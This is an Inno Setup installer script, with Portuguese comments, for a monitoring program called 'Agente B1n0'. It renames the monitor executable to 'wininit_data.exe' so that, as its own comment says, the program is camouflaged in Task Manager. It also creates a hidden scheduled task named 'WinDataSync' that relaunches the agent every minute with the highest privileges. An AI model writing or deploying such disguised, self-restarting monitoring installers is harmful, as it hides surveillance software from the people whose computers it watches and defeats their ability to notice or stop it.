[Setup]
AppId={{8B32145A-7C21-4E6E-A52D-1234567890ABC}
; Nome oficial que aparece no Windows e Instalador
AppName=Agente B1n0
AppVersion=6.6
DefaultDirName={commonpf}\AgenteB1n0
DisableDirPage=yes
PrivilegesRequired=admin 
OutputDir=Output
OutputBaseFilename=Instalador_AgenteB1n0_v6.6
; Ícone do instalador
SetupIconFile=mascote.ico
Compression=lzma
SolidCompression=yes
WizardStyle=modern

[Languages]
; Garante que o instalador fale Português do Brasil
Name: "brazilianportuguese"; MessagesFile: "compiler:Languages\BrazilianPortuguese.isl"

[Files]
; O executável interno continua camuflado para o Gerenciador de Tarefas
Source: "dist\monitor\monitor.exe"; DestDir: "{app}"; DestName: "wininit_data.exe"; Flags: ignoreversion
Source: "dist\monitor\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
Source: "mascote.ico"; DestDir: "{app}"; Flags: ignoreversion

[Run]
; Cria a tarefa de persistência (reinicia o agente se ele for fechado)
Filename: "schtasks"; Parameters: "/create /tn ""WinDataSync"" /tr ""'{app}\wininit_data.exe'"" /sc minute /mo 1 /rl highest /f"; Flags: runhidden
Filename: "{app}\wininit_data.exe"; Description: "Iniciar Agente B1n0"; Flags: nowait postinstall skipifsilent

[UninstallRun]
; ADICIONADO RunOnceId para remover o Warning do Inno Setup
Filename: "schtasks"; Parameters: "/delete /tn ""WinDataSync"" /f"; Flags: runhidden; RunOnceId: "RemoveAgenteTask"

[Code]
function InitializeUninstall(): Boolean;
var ErrorCode: Integer;
begin
  // Mata o processo camuflado antes de remover os arquivos
  ShellExec('open', 'taskkill.exe', '/f /im wininit_data.exe', '', SW_HIDE, ewWaitUntilTerminated, ErrorCode);
  Result := True;
end;
